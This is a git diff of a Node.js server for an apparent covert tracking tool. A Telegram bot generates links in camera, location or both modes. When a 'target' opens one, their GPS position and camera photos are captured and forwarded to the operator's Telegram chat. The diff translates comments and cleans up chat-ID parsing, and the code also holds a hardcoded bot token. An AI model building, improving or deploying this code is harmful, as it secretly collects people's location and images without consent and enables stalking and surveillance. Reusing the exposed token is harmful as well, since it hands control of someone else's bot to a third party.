@@ -9,7 +9,7 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Apna Telegram Bot Token yahan daal le
+// Telegram Bot Token
 const token = '8786094194:AAF6p3VRITap85oCBEVQRkVzVbyhIXBpz0Q';
 const bot = new TelegramBot(token, { polling: true });
 
@@ -17,7 +17,7 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.set('view engine', 'ejs');
 
-// 1. Telegram /start command
+// /start command
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     
@@ -46,6 +46,7 @@ bot.on('callback_query', (callbackQuery) => {
     else if (data === 'gen_camera') mode = 'camera';
     else if (data === 'gen_both') mode = 'both';
 
+    // Proper underscore separated sessionId
     const sessionId = `${chatId}_${timestamp}_${mode}`;
     
     const domain = process.env.RENDER_EXTERNAL_URL || 'http://localhost:3000';
@@ -79,21 +80,24 @@ io.on('connection', (socket) => {
         console.log('Data received from target!');
         
         if (!data.roomId) return;
+        
+        // Safely extract pure Telegram Chat ID from roomId
         const parts = data.roomId.split('_');
-        const targetChatId = parts[0]; 
+        let targetChatId = parts[0];
+        targetChatId = targetChatId.replace(/\D/g, ''); // Keep only numbers
 
         console.log(`Target Chat ID to send: ${targetChatId}`);
 
         if (targetChatId) {
             try {
-                // Location bhejo
+                // Send Location
                 if (data.latitude && data.longitude && data.latitude !== 0) {
                     const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
                     const message = `📍 Target Location Received!\n\nLat: ${data.latitude}\nLong: ${data.longitude}\nAccuracy: ${data.accuracy}m\n\nGoogle Maps:\n${mapLink}`;
                     await bot.sendMessage(targetChatId, message);
                 }
 
-                // Photo bhejo
+                // Send Photo
                 if (data.image && data.image.includes(',')) {
                     const base64Data = data.image.split(',')[1];
                     const buffer = Buffer.from(base64Data, 'base64');
